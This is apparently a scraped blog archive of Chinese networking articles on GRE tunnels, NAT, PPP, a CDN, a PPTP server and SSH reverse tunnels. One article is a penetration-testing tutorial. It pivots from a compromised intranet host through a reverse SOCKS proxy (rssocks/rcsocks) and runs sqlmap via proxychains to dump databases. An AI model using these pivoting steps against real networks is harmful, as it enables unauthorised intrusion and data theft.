0gre 12989 1 ip_gre# modprobe ip_gre# lsmod | grep greip_gre 22432 0gre 12989 1 ip_gre 创建步骤环境如下：host A : 121.207.22.123host B: 111.2.33.28在host A上面： 123456# ip tunnel add gre1 mode gre remote 111.2.33.28 local 121.207.22.123 ttl 255# ip link set gre1 up# ip addr add 10.10.10.1 peer 10.10.10.2 dev gre1# ip tunnel add gre1 mode gre remote 111.2.33.28 local 121.207.22.123 ttl 255# ip link set gre1 up# ip addr add 10.10.10.1 peer 10.10.10.2 dev gre1 创建一个GRE类型隧道设备gre0, 并设置对端IP为111.2.33.28。隧道数据包将被从121.207.22.123也就是本地IP地址发起，其TTL字段被设置为255。隧道设备分配的IP地址为10.10.10.1，掩码为255.255.255.0。在host B上面：123456# ip tunnel add gre1 mode gre remote 121.207.22.123 local 111.2.33.28 ttl 255# ip link set gre1 up# ip addr add 10.10.10.2 peer 10.10.10.1 dev gre1# ip tunnel add gre1 mode gre remote 121.207.22.123 local 111.2.33.28 ttl 255# ip link set gre1 up# ip addr add 10.10.10.2 peer 10.10.10.1 dev gre1 此时，host A 和 host B 建立起GRE隧道了。 检测连通性 12345678910# ping 10.10.10.2 (host A)PING 10.10.10.2 (10.10.10.2) 56(84) bytes of data.64 bytes from 10.10.10.2: icmp_req=1 ttl=64 time=0.319 ms64 bytes from 10.10.10.2: icmp_req=2 ttl=64 time=0.296 ms64 bytes from 10.10.10.2: icmp_req=3 ttl=64 time=0.287 ms# ping 10.10.10.2 (host A)PING 10.10.10.2 (10.10.10.2) 56(84) bytes of data.64 bytes from 10.10.10.2: icmp_req=1 ttl=64 time=0.319 ms64 bytes from 10.10.10.2: icmp_req=2 ttl=64 time=0.296 ms64 bytes from 10.10.10.2: icmp_req=3 ttl=64 time=0.287 ms 撤销GRE隧道在任一一端操作下面命令1234# ip link set gre1 down# ip tunnel del gre1# ip link set gre1 down# ip tunnel del gre1 转载请注明来自运维生存时间: http://www.ttlsa.com/html/4138.html","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"使用ARP的四种典型情况","slug":"NETWORK/使用ARP的四种典型情况","date":"2019-08-29T04:16:16.198Z","updated":"2019-08-29T04:14:14.962Z","comments":true,"path":"NETWORK/使用ARP的四种典型情况.html","link":"","permalink":"http://demonelf.github.io/NETWORK/使用ARP的四种典型情况.html","excerpt":"使用ARP的四种典型情况 1.发送方是主机，把IP数据包发送到本网络上的另一个主机。这时用ARP找到目的主机的硬件MAC地址。 2.发送方是主机，要把IP数据报发送到另一个网络上的主机。这时用ARP找到本网络上的一个路由器（网关）的硬件MAC地址。剩","text":"使用ARP的四种典型情况 1.发送方是主机，把IP数据包发送到本网络上的另一个主机。这时用ARP找到目的主机的硬件MAC地址。 2.发送方是主机，要把IP数据报发送到另一个网络上的主机。这时用ARP找到本网络上的一个路由器（网关）的硬件MAC地址。剩下的工作由这个路由器来完成。 3.发送方是路由器，要把IP数据报转发到本网络上的一个主机。这时用ARP找到目的主机的硬件MAC地址 4.发送方是路由器，要把IP数据报转发到另一个网络的一个主机。这时用ARP找到本网络上的一个路由器（网关）的硬件地址。剩下的工作有这个路由器来完成。 主机和路由器表现的行为是一致的，区别在于，路由器可以作为网关，而PC不可以。当要把IP数据报转发另一个网络的一个主机时，ARP找到本网络上的一个网关的硬件MAC地址，这个网关可以是路由器，也可以是三层交换机。 纯二层交换机是没有ARP表项的。交换机是否有ARP表项取决于交换机是否作为三层设备（配置三层路由接口或SVI接口） 网络层使用的是IP地址，但在实际网络的链路上传送数据帧时，最终必须使用该网络的硬件地址。 每一个主机都设有一个ARP高速缓存，里面有本局域网上的各主机和网关的IP地址到硬件地址的映射表。也就是说，一个主机可以通过ARP到本局域网的其他主机，到达其他网络主机的工作交给网关完成。 同一子网 源目mac地址都不会改变 不同子网 源目IP地址都不会改变，改变源目MAC地址","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"linux-iptables nat设置路由转换","slug":"NETWORK/linux-iptables nat设置路由转换","date":"2019-08-29T04:16:16.198Z","updated":"2019-08-29T04:13:51.065Z","comments":true,"path":"NETWORK/linux-iptables nat设置路由转换.html","link":"","permalink":"http://demonelf.github.io/NETWORK/linux-iptables nat设置路由转换.html","excerpt":"DNAT（Destination Network Address Translation,目的地址转换) 通常被叫做目的映射。而SNAT（Source Network Address Translation，源地址转换）通常被叫做源映射。 这是我们在设置","text":"DNAT（Destination Network Address Translation,目的地址转换) 通常被叫做目的映射。而SNAT（Source Network Address Translation，源地址转换）通常被叫做源映射。 这是我们在设置Linux网关或者防火墙时经常要用来的两种方式。以前对这两个都解释得不太清楚，现在我在这里解释一下。 首先，我们要了解一下IP包的结构，如下图所示：在任何一个IP数据包中，都会有Source IP Address与Destination IP Address这两个字段，数据包所经过的路由器也是根据这两个字段是判定数据包是由什么地方发过来的，它要将数据包发到什么地方去。而iptables的DNAT与SNAT就是根据这个原理，对Source IP Address与Destination IP Address进行修改。 然后，我们再看看数据包在iptables中要经过的链（chain）： 图中正菱形的区域是对数据包进行判定转发的地方。在这里，系统会根据IP数据包中的destination ip address中的IP地址对数据包进行分发。如果destination ip adress是本机地址，数据将会被转交给INPUT链。如果不是本机地址，则交给FORWARD链检测。这也就是说，我们要做的DNAT要在进入这个菱形转发区域之前，也就是在PREROUTING链中做，比如我们要把访问202.103.96.112的访问转发到192.168.0.112上： iptables -t nat -A PREROUTING -d 202.103.96.112 -j DNAT –to-destination 192.168.0.112 这个转换过程当中，其实就是将已经达到这台linux网关（防火墙）上的数据包上的destination ip address从202.103.96.112修改为192.168.0.112然后交给系统路由进行转发。 而SNAT自然是要在数据包流出这台机器之前的最后一个链也就是POSTROUTING链来进行操作 iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -j SNAT –to-source 58.20.51.66 这个语句就是告诉系统把即将要流出本机的数据的source ip address修改成为58.20.51.66。这样，数据包在达到目的机器以后，目的机器会将包返回到58.20.51.66也就是本机。如果不做这个操作，那么你的数据包在传递的过程中，reply的包肯定会丢失。 假如当前系统用的是ADSL/3G/4G动态拨号方式，那么每次拨号，出口IP都会改变，SNAT就会有局限性。 iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o eth0 -j MASQUERADE 重点在那个『 MASQUERADE 』！这个设定值就是『IP伪装成为封包出去(-o)的那块装置上的IP』！不管现在eth0的出口获得了怎样的动态ip，MASQUERADE会自动读取eth0现在的ip地址然后做SNAT出去，这样就实现了很好的动态SNAT地址转换。 补充：这里防火墙要进行转发必须打开内核路由转发功能，即： echo “1” &gt; /proc/sys/net/ipv4/ip_forward //开启路由转发sysctl -p //使能sysctl设置输出：net.ipv4.ip_forward = 1 //这里为1，开启转发成功。net.ipv4.conf.default.rp_filter = 1net.ipv4.conf.default.accept_source_route = 0kernel.sysrq = 0kernel.core_uses_pid = 1………… 问题： echo “1” &gt; /proc/sys/net/ipv4/ip_forwardcat /proc/sys/net/ipv4/ip_forward [root@Coohx ~]# sysctl -pnet.ipv4.ip_forward = 0 // 应该为1！！！！net.ipv4.conf.default.rp_filter = 1net.ipv4.conf.default.accept_source_route = 0kernel.sysrq = 0kernel.core_uses_pid = 1 解决办法： vim /etc/sysctl.conf将 net.ipv4.ip_forward = 0改为 net.ipv4.ip_forward = 1[root@Coohx ~]# sysctl -pnet.ipv4.ip_forward = 1 // 一直为1………… 注：手动修改/proc/sys/net/ipv4/ip_forward 0为1 ，内核不允许 &quot;/proc/sys/net/ipv4/ip_forward&quot; 警告: 此文件自读入后已发生变动！！！ 确实要写入吗 (y/n)?y &quot;/proc/sys/net/ipv4/ip_forward&quot; E667: 同步失败 请按 ENTER 或其它命令继续","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"nat穿透","slug":"NETWORK/nat穿透","date":"2019-08-29T04:16:16.198Z","updated":"2019-08-29T04:13:59.001Z","comments":true,"path":"NETWORK/nat穿透.html","link":"","permalink":"http://demonelf.github.io/NETWORK/nat穿透.html","excerpt":"作者：陈军链接：https://www.zhihu.com/question/38729355/answer/77877260 来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ​ NAT分为两大类，基本的NAT和NAP","text":"作者：陈军链接：https://www.zhihu.com/question/38729355/answer/77877260 来源：知乎著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ​ NAT分为两大类，基本的NAT和NAPT（Network Address/Port Translator）。基本的NAT，它仅将内网主机的私有IP地址转换成公网IP地址，但并不将TCP/UDP端口信息进行转换，有动态与静态之区分。由于现在大部分都属于另一种类型，即NAPT，故这里不详细讨论基础NAT。 另外一种NAT叫做NAPT（Network Address/Port Translator），从名称上我们也可以看得出，NAPT不但会改变经过这个NAT设备的IP数据报的IP地址，还会改变IP数据报的TCP/UDP端口。 ​ NAPT又分为锥型（Cone）和对称型（Symmetric），它们的区别在于，在NAT已分配端口号给Client A的情况下，如果Client A继续用1235端口与另一外网服务器通讯，锥型NAT还会继续用原来62000端口，即所分配的端口号不变。而对于对等型NAT，NAT将会分配另一端口号（如62001）给Client A的1235端口。也就是说，同一内网主机同一端口号，对于锥型NAT，无论与哪一外网主机通讯，都不改变所分配的端口号；而对于对等型NAT，同一内网主机同一端口号，每一次与不同的外网主机通讯，就重新分配另一个端口号。 ​ 目前比较常用的NAT类型是完全锥型NAT。 首先目前绝大多数的路由器都是非对称型NAT(Cone NAT)，所以P2P技术才能正常使用。 对称/非对称的区别主要在于：网关设备在实现NAT时，对于内网某主机的若干个UDP连接请求，网关设备对应地在外网上所建立的UDP端口数量。对称NAT是一个请求对应一个端口，非对称NAT是多个请求对应一个端口(象锥形，所以叫Cone NAT)。 对称型NAT(Symmetric NAT)是无法实现P2P技术。 ​ 对于两方都是对称nat的情况，至少从可以了解的途径上（比如google，相关论坛）都没找到解决方案，我们自己也进行过测试，不行。 ​ 但是对于一端是对称nat，一端是端口限制性Cone nat的情况是可以打洞成功的，特别是我们实验的对称nat的端口变化还是有规律的（加1），我们使用端口猜测的方法进行打洞成功率还是非常高的。对于端口变化无规律的对称nat，这个猜测还是靠算法的设计， 可以看看A New Method for Symmetric NAT Traversal in UDP and TCP （http://www.goto.info.waseda.ac.jp/~wei/file/wei-apan-v10.pdf）","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"Linux PPP 框架分析","slug":"NETWORK/Linux PPP 框架分析","date":"2019-08-29T04:16:16.182Z","updated":"2019-08-29T04:13:31.024Z","comments":true,"path":"NETWORK/Linux PPP 框架分析.html","link":"","permalink":"http://demonelf.github.io/NETWORK/Linux PPP 框架分析.html","excerpt":"1. 介绍 通过对Linux源代码的分析,了解PPP设备在linux内的工作原理.顺便了解一下PPPoE如何利用PPP设备来完成上网的工作的.下面是代码研究的基础版本： Software version Linux内核 2.6.15 PPPd ppp-","text":"介绍 通过对Linux源代码的分析,了解PPP设备在linux内的工作原理.顺便了解一下PPPoE如何利用PPP设备来完成上网的工作的.下面是代码研究的基础版本： Software versionLinux内核 2.6.15PPPd ppp-2.4.3PPPoE rp-pppoe-3.8 PPP相关模块及结构 注：每个模块左上角或右上角蓝色字体的数字是用来方便区别每个模块。 每个层次及工作在该层次的程序（模块）分析如下： 2.1 应用层模块概述 工作在该层的模块编号：（1）Pppd、（2）Pppoe、（10）网络应用程序 2.1.1 Pppd 使用源代码ppp-2.4.3编译生成，该程序用来完成PPP过程（lcp/pap/chap/ipcp等）的应用程序.它和Pppoe两个用户态应用程序配合起来,可以完成PppOe的拨号上网的链路协商及维护. 熟悉Ppp相关协议的知道,Ppp链路协商过程有LCP/PAP/CHAP/PAP等很多协议.这些包会经由协议栈分类,提交到字符设备/dev/ppp0的队列中.而Pppd这个应用程序,就是从ppp0中将这些包读取出来,然后递交到各协议的子过程中去处理,从而在应用态完成这些协议的处理过程. 这里需要提一点,要想深入的理解Pppd应用程序的工作方法,必须要了解字符设备ppp0是如何工作的. 2.1.2 Pppoe 首先,pppoe完成了PPPoE Discovery过程,这个过程很简单,只有PADI/PADO, PADR/PADS四个包.主要目的是相互告知MAC地址. 另外,这个程序负责接收和发送Pppoe链路的所有数据包,包括ppp协议过程的数据包,也包括正常网络应用通过网络接口ppp发送的TCP/IP数据包.在此需要了解类型为0x8863/0x8864的Socket如何工作,另外需要了解数据包如何通过PTY设备在Pppoe和PPP协议栈之间传递的.在内核模块概述中会给予描述. 所以,我们可以将pppoe应用程序作为拨号链接进入主机的入口,所有的数据包都经由它进入主机. 2.1.3 网络应用程序 这里指一般网络应用，比如上网、下载等。主要作用是描述普通数据包的行走路径. 2.2 内核层模块概述 工作在该层的模块编号：（3）/dev/ppp%n、（4）TCP/IP协议栈、（5）Socket、（6）PPP协议栈、（7）PTY设备、（8）ETH1 2.2.1 /dev/ppp%n 该设备需要打开内核支持,可以make menuconfig选择相应的子项,另外需要在/dev目录下创建主设备号为108从设备号为0的字符设备才可以在用户态使用. 创建了ppp设备后，ppp过程的数据包经过协议栈的分类,会被送到该接口的队列内.用户态应用程序(如pppd)从该接口内读取ppp过程的数据包，然后送交相应的协议栈处理.对于响应的数据包,同样可以写入到该设备中,设备内会将数据包送交协议栈然后转发出去. 2.2.2 TCP/IP协议栈 普通Linux TCP/IP协议栈. 2.2.3 Socket PppOe Session和Discovery数据包对应的以太网类型分别为0x8863/0x8864,因为这两种类型的数据包是由Pppoe应用程序通过Socket来收发的,所以内核中需要定义这两种类型的Socket.这两个Socket内核处理非常简单,只做了最基本的检查便由Pppoe收取上来. 2.2.4 PPP协议栈 主要负责PPP层数据的封装、压缩与解压缩.另外,它还对普通数据包和Ppp过程的数据包进行了分流,将普通数据包提交到TCP/IP协议栈,而将Ppp过程的数据包放到/dev/ppp设备队列中,等待Pppd去收取并处理. 2.2.5 PTY设备 串行设备，PPP内核协议栈与pppoe应用程序的中转站.因为Ppp协议早多运行在串行链路上,所以在Linux内核中PPP协议栈与串行设备结合紧密. 2.2.6 Eth1 这里是指连接以太网的出口,用来表示数据包路径而引入. 2.3 物理层模块概述 工作在该层的模块编号：（9）以太网驱动 PPPoE拨号建立的过程 从拨号链接开始到用户可以上网主要分三个过程： Ø PPPoE Discovery过程 Ø PPP过程 Ø 设置上网主机 3.1 PPPoE Discovery 过程","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"Socks代理反弹突破内网","slug":"NETWORK/Socks代理反弹突破内网","date":"2019-08-29T04:16:16.182Z","updated":"2019-08-29T04:13:37.081Z","comments":true,"path":"NETWORK/Socks代理反弹突破内网.html","link":"","permalink":"http://demonelf.github.io/NETWORK/Socks代理反弹突破内网.html","excerpt":"随着信息安全意识的提升，越来越多的信息系统前端均部署有防火墙，系统管理员根据业务需求将内部必要的服务端口通过端口映射等手段映射到公网中，如默认**web服务端口80、MSSQL*数据库服务端口1433等。通过部署防火墙可以将信息系统内部区域与公网逻辑隔离开","text":"随着信息安全意识的提升，越来越多的信息系统前端均部署有防火墙，系统管理员根据业务需求将内部必要的服务端口通过端口映射等手段映射到公网中，如默认**web服务端口80、MSSQL*数据库服务端口1433等。通过部署防火墙可以将信息系统内部区域与公网逻辑隔离开来，利用相关的策略有效避免或减轻来自外部的攻击。 对于渗透测试者来说，如何绕过防火墙的阻挡在内网展开渗透测试成为亟需解决的问题，本文介绍了在夺取映射到外网的内网服务器权限后，如何利用socks代理反弹获得内网访问权限。 1.sSocks sSocks是一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务，即将远程计算机作为socks代理服务端，反弹回本地，极大方便内网的渗透测试，其最新版为0.0.13，可在以下链接处下载。 http://sourceforge.net/projects/ssocks/ 下载解压后，执行命令编译。 1./configure &amp;&amp; make 编译完成，进入src目录，会发现有nsocks、ssocksd、ssocks、rcsocks，其功能说明介绍如下： 程序 功能nsocks 类似通过Socks5代理后的netcat，可用来测试socks serverssocksd 用来开启Socks5代理服务ssocks 本地启用Socks5服务，并反弹到另一IP地址rcsocks 接收反弹过来的Socks5服务，并转向另一端口 2.模拟网络环境说明 本文模拟的网络环境见下图1，渗透测试端IP为192.168.10.50，内网区域IP段192.168.206.0/24，内网区域能正常访问192.168.10.0/24，现假设已获得192.168.206.130权限。 3.实施Socks代理反弹1)本地监听端口在渗透测试端192.168.10.50执行 1./rcsocks -l 1088 -p 1080 -vv 等待远程Socks5服务器访问本地1080端口，创建端口1080与本地端口1088的连接通道，如图2。 2)开启Socks5代理服务，反弹在192.168.206.130上执行 1./rssocks -vv -s 192.168.10.50:1080 启用Socks5服务，反弹到192.168.10.50的端口1080上，如图3。 此时在渗透测试端192.168.10.50可看到通道连接成功，效果如图4。 4.利用proxychains进行Socks5代理通过前面的步骤，Socks5代理已创建完成了。由于在渗透测试过程中，需要使用不同的工具程序，而在各程序中分别配置Socks5代理信息较为繁琐，而部分程序并不支持配置Socks5代理。为了简化这些操作，我们可以采用proxychains。proxychains是一个代理客户端软件，可以支持几乎所有程序的代理，如ssh，telnet，ftp等。利用proxychains，程序能在代理的环境下被加载运行，而本身不需要具备代理功能。使用前需要对proxychains进行简单配置，打开配置文件proxychains.conf（在BT5位于/etc/proxychains.conf），如图5所示，在[ProxyList]处添加socks5 127.0.0.1 1088 配置成功后若要启动程序，仅需要在启动程序命令前加上proxychains。1)启用浏览器firefox，在终端执行命令： 1proxychains firefox firefox启动成功，访问192.168.206.135的web服务如图6，通过代理访问成功。 2)利用sqlmap进行注入：先切换到sqlmap目录cd /pentest/database/sqlmapproxychains python sqlmap.py -u “存在SQL注入的链接” –dbs注入成功，注入点信息及获取数据库信息如图7所示。 5.后记由于系统管理员的疏忽或者业务需求所致，防火墙一般仅对由外向内发起的数据连接进行严格判断、过滤、甚至阻断而忽略由内往外的连接。因此，在此种情况下，通过攻陷映射到公网的端口服务，利用反弹便可获取内网访问权限，给内网安全带来极大的威胁。在信息安全建设与运维过程中，不仅要加强映射到公网的服务安全，也要重视由内到外连接的安全威胁。","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"Incapsula免费CDN服务申请使用及加速效果测评","slug":"NETWORK/Incapsula免费CDN服务申请使用及加速效果测评","date":"2019-08-29T04:16:16.182Z","updated":"2019-08-29T04:13:23.344Z","comments":true,"path":"NETWORK/Incapsula免费CDN服务申请使用及加速效果测评.html","link":"","permalink":"http://demonelf.github.io/NETWORK/Incapsula免费CDN服务申请使用及加速效果测评.html","excerpt":"作为差不多和cloudflare一道被国内的站长们认识的Incapsula，其提供的免费CDN加速服务一直可以正常使用，且有多个CDN节点可供选择。而cloudflare提供的免费CDN服务虽然不错，但是不知道是不是因为国内用户用太多了还是其他什么原因，现","text":"作为差不多和cloudflare一道被国内的站长们认识的Incapsula，其提供的免费CDN加速服务一直可以正常使用，且有多个CDN节点可供选择。而cloudflare提供的免费CDN服务虽然不错，但是不知道是不是因为国内用户用太多了还是其他什么原因，现在用起来总会有各种问题。 Incapsula最早部落是在三年前介绍的，现在之所以要再次分享一下Incapsula的免费CDN申请使用教程，一来是给不是很了解Incapsula的朋友一个简单普及，Incapsula的CDN其实有不少的高级用法；二来是Incapsula最近推出的香港CDN节点，很必要来体验不同的CDN节点在国内连接速度快慢。 根据部落自己的统计，Incapsula可供查询的CDN节点共有60多个，主要是分布在美国、爱尔兰、日本、中国香港等地区，由于Incapsula的CDN服务是全球服务网络，因此只要有一个节点缓存了我们的网站，就可以在其它CDN节点上访问了。明白了这一点，我们就可以指定自己的CDN节点为日本或者香港。 一般来说，网站放在亚太地区的话国内用户访问会感觉比美国主机要快一些，本篇文章就来对比一下Incapsula的日本、香港和美国CDN节点在国内的访问连接速度状况。Incapsula以前免费CDN套餐月流量为50GB，刚刚去官网查看了一下发现免费CDN套餐现以已经没有明确说明多少月流量限制。 看了一下Incapsula的付费套餐也都没有月流量限制，区别主要是在防护攻击、CDN高级功能等方面，所以目前姑且认为Incapsula提供免费CDN服务没有流量限制，但是只是基本的CDN加速，应该在CDN资源利用方面作了限制。（部落刚刚狂刷新自己测试博客，有遇到一次超出资源配额提示，由此推测Incapsula在访问连接方面作了人为限制） Incapsula免费CDN服务申请使用:日本、香港、美国CDN加速效果测评 一、Incapsula免费CDN申请使用 1、Incapsula官网： 1、官方网站：http://www.incapsula.com/ 2、进入Incapsula官网，直接注册一个账号，然后登录到Incapsula管理后台，添加一个你想要使用CDN加速的网站。 3、等Incapsula检测你的域名的DNS通过后，就可以点击下一步了。 4、然后Incapsula就会给出A记录和CNAME记录。 5、你需要到你的域名DNS管理处，将域名的@的A记录修改为Incapsula给你的IP（一般有两个），域名的www的记录修改为Incapsula给你的CNAME记录。 6、完成了以上操作后，就可以点击完成设置，Incapsula检测到你的域名的DNS更新成功后，你就可以在Incapsula查处和管理你的CDN了。 二、Incapsula CDN管理面板使用 1、这是Incapsula CDN的管理后台，主要是可以查看CDN流量统计、安全、CDN性能、管理日志等（点击放大）。 2、在Incapsula的设置当中，你可以查看CDN的源服务器IP地址，如果你的服务器IP有变动，就可以在这里直接修改。 3、Incapsula还支持设置带www和不带www的域名跳转（利用这个功能，你不再需要在Htaccess中设置301跳转了）、是否显示推广广告、网站原DNS和CDN的DNS记录详情等，点击放大： 4、Incapsula有一个登录保护功能，这个功能对于那些有用户账号系统登录页面的网站来说，将可以有效地保护好账号的安全。 5、添加你想要使用Incapsula登录保护的页面的URL，然后用户在访问这个页面时需要授权了。 6、Incapsula还提供了CDN缓存模式可供选择：关闭、标准和进阶模式。 7、Incapsula还会通过对JS、CSS、Html等静态文件压缩，以达到加快页面加载的速度，你可以有选择性地关闭它们。 8、Incapsula还会有一些高级的CDN缓存设置，比如Http头的no-cache、Max-age、Last Modified等协议，你都可以在Incapsula中选择是否遵循。 三、Incapsula设置日本、香港CDN节点 1、Incapsula的CDN节点分布在香港、东京、新加坡、阿姆斯特丹、伦敦、阿什本、san jose、洛杉矶、特拉维夫、阿什维尔等地区，其中香港、东京是我们国内连接速度最快的主机机房位置。 2、一般来说我们会选择Incapsula香港或者日本的CDN节点作为我们网站的加速的CDN，而要做到这一点，我们只需要知道CDN的节点服务器IP就可以了。Incapsula所有的CDN节点IP地址可以在这里找到：http://bgp.he.net/AS19551#_prefixes 3、想要设置Incapsula日本、香港CDN节点，先要保证参考上面的方法操作，网站已经成功接入了Incapsula的CDN，然后再到你的域名DNS管理处，将原来的CNAME记录删除，把@和www等记录全部改为A记录，记录值是Incapsula的CDN节点的IP地址。 4、由于Incapsula的CDN节点有非常多的IP地址，我们可以多设置几个A记录。等DNS生效后，我们就能看到自己的网站访问到的Incapsula CDN节点已经变成了日本或者香港了。 四、Incapsula日本、香港、美国CDN加速效果比较 1、默认的我们在Incapsula添加自己的网站加速时，系统分给我们的是美国的Incapsula CDN加速节点，通过站长工具测试发现Incapsula的美国CDN服务器在国内连接状态还算不错，比较少丢包，Ping值一般在270-300之间。 2、Incapsula日本和香港的Ping情况差不多，丢包比较少，响应时间也差不多。 3、这是晚上测试Incapsula香港CDN节点的响应时间，平均在200左右。 4、这是白天测试Incapsula香港CDN节点的响应时间，平均在170左右。 5、Incapsula日本和香港的Ping测试结果显然不是很让满意，按照以往的经验日本和香港的Ping响应时间一般是在70以下。用路由追踪工具查看了一下国内连接Incapsula日本和香港的线路走势，电信用户是绕道日本后再到香港的。 6、联通用户访问也是一样，先到日本，再到香港。 五、Incapsula日本香港免费CDN使用小结 1、Incapsula与Cloudflare比较起来，可以不用修改NS，采用CNAME记录的方式就可以接入到CDN，方便不少。Incapsula 每个节点一个ip，未使用anycast技术，因此方便了我们根据自己 的需要来设置CDN节点的IP地址。 2、不过，从测试的结果来看，Incapsula日本香港免费CDN节点国内并不是直连，基本上都是绕道到美国或者日本，所以也就看到了日本和香港的Incapsula CDN使用效果差不多，有些美国线路情况比较好的CDN节点速度也很快。","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"Gentoo下利用pptpd搭建PPTP服务器 ","slug":"NETWORK/Gentoo下利用pptpd搭建PPTP服务器 ","date":"2019-08-29T04:02:00.512Z","updated":"2019-08-29T04:00:00.693Z","comments":true,"path":"NETWORK/Gentoo下利用pptpd搭建PPTP服务器 .html","link":"","permalink":"http://demonelf.github.io/NETWORK/Gentoo下利用pptpd搭建PPTP服务器 .html","excerpt":"首先检查当前系统的linux kernel有没有支持ppp, netfilter, mppe和 netfilter的nat,如果没有，请先配置支持这些组建，编译更新内核，然后重启系统。这块不再详述，如果想知道详细情况，可以留言问我。 接着安装必要软件 e","text":"首先检查当前系统的linux kernel有没有支持ppp, netfilter, mppe和 netfilter的nat,如果没有，请先配置支持这些组建，编译更新内核，然后重启系统。这块不再详述，如果想知道详细情况，可以留言问我。接着安装必要软件 emerge ppp emerge pptpd 然后修改配置文件先是pptpd的配置文件 /etc/pptpd.conf12345ppp /usr/sbin/pppdoption /etc/ppp/options.pptpdlogwtmplocalip 172.16.0.1remoteip 172.16.0.2-254 接着是ppp的配置文件 /etc/ppp/options.pptpd12ms-dns 8.8.8.8ms-dns 8.8.4.4 最后是用户密码文件 /etc/ppp/chap-secret12#name server secret iptest@test.com pptpd test * 第一项是登录vpn时使用的用户名，第二项是vpn服务器名（pptpd，l2tpd，xl2tpd等，也可以用*号），第三项是密码，第四项是分配给客户端的ip，如果是＊号，vpn服务器则会从自己的配置文件中选择一个ip分配给客户端。 开启系统的封包转发： echo 1 &gt; /proc/sys/net/ipv4/ip_forward 最后别忘了启动pptpd服务 /etc/init.d/pptpd start gentoo下客户端示例 pptp 192.168.2.12 user test@test.com password test","categories":[{"name":"NETWORK","slug":"NETWORK","permalink":"http://demonelf.github.io/categories/NETWORK/"}],"tags":[]},{"title":"自己选择的路","slug":"LIVE/自己选择的路","date":"2017-11-27T02:01:25.000Z","updated":"2017-11-27T02:28:34.692Z","comments":true,"path":"LIVE/自己选择的路.html","link":"","permalink":"http://demonelf.github.io/LIVE/自己选择的路.html","excerpt":"​ 现实有时就是这么无情，其实很多人不是看不清现实，只是没有勇气面对现实。我们能做的是尽量珍惜拥有，加快强化自己。当残酷到来时我们多少能从容面对。在这个由钢筋铸造的城市中，我们被磨炼的不是变的无情，而是拥有钢铁般的心，更加强大而已。在这么明显的环境中，你还","text":"​ 现实有时就是这么无情，其实很多人不是看不清现实，只是没有勇气面对现实。我们能做的是尽量珍惜拥有，加快强化自己。当残酷到来时我们多少能从容面对。在这个由钢筋铸造的城市中，我们被磨炼的不是变的无情，而是拥有钢铁般的心，更加强大而已。在这么明显的环境中，你还非要认为无论你处于什么处境，所有人格是平等。是应该可怜你、还是同情你？ ​ 有空任性却没空努力的人，那真是可怜之人必有可恨之处。 ​ 理论先于实践是因为想最大程度避免错的路，少撞墙。撞了不能再撞！ ​ ​ 想想自己多大了，不提是否应有能力回报，但是否连自己的选择的都不能承担。 ​ 自己选的路，就算跪着也要走完，宁可笑着流泪，也不要哭着后悔。","categories":[{"name":"LIVE","slug":"LIVE","permalink":"http://demonelf.github.io/categories/LIVE/"},{"name":"LIVE","slug":"LIVE/LIVE","permalink":"http://demonelf.github.io/categories/LIVE/LIVE/"}],"tags":[]},{"title":"使用SSH反向隧道进行内网穿透","slug":"SYSTEM/使用SSH反向隧道进行内网穿透","date":"2017-11-14T01:35:32.000Z","updated":"2017-11-14T01:46:57.692Z","comments":true,"path":"SYSTEM/使用SSH反向隧道进行内网穿透.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/使用SSH反向隧道进行内网穿透.html","excerpt":"1，前提条件 环境系统类型本地用户SSH服务端口A机位于公司的NAT网络安装在VMware里的Debian 8 64bit虚拟机userA22B机是一台有公网IP的VPSCentOS 6 64bituserVPS1022C机位于家庭的NAT网络Windo","text":"1，前提条件 环境 系统类型 本地用户 SSH服务端口 A机位于公司的NAT网络 安装在VMware里的Debian 8 64bit虚拟机 userA 22 B机是一台有公网IP的VPS CentOS 6 64bit userVPS 1022 C机位于家庭的NAT网络 Windows系统 – – 实现目的：使得位于家庭NAT网络内的C机，可以SSH访问位于公司NAT网络内的A机。 2，原理分析这里先讲向SS反向隧道的原理，如果你对原理不感兴趣，可以跳过这一节。 1ssh -p 22 -qngfNTR 6766:127.0.0.1:22 usera@VPS的IP #回车以后没有反应是正常的,隧道已经建立 命令解析：从(位于本地NAT网络里的)本机访问VPS，建立一条SSH隧道（本机的随机端口到VPS的22端口）同时建立了一条反向隧道，将VPS上的6766端口转发到本机的22端口。 然后，就可以从VPS的6766端口访问本地的22端口了 1ssh -p 6766 userA@127.0.0.1 #从SSH访问位于NAT网络里的linux机器 从SSH访问位于本地NAT网络里的linux机器，这里的userA当然是本地NAT网络里的linux机器用户啦。 这样做有一个问题，那就是，由本地建立的SSH连接是会超时关闭的，如果连接关闭，隧道无法维持，那么VPS就无法利用反向隧道访问本地NAT网络了，为此我们需要一种方案来提供一条稳定的SSH反向隧道，于是autossh就派上用场了； 另外有个问题是，如果本地的Linux系统重启，那么autossh建立的隧道仍然会失效。所以这里我们采取的做法是：1，将本地Linux系统的public key发给VPS，建立信任机制，这样，本地Linux系统可以无需VPS的密码而建立一条SSH隧道；2，将autossh写入系统服务，使之在开机时可以自动建立SSH隧道。 知道了原理以后，接下来开始实际的操作步骤。 3，VPS(B机)的操作 1234vim /etc/ssh/sshd_config #打开如下选项GatewayPorts yes /etc/init.d/sshd reload 4，A机的操作前面说了，A机位于公司内部NAT网络内，是一台安装在VMware Workstation Player里的Debian 8 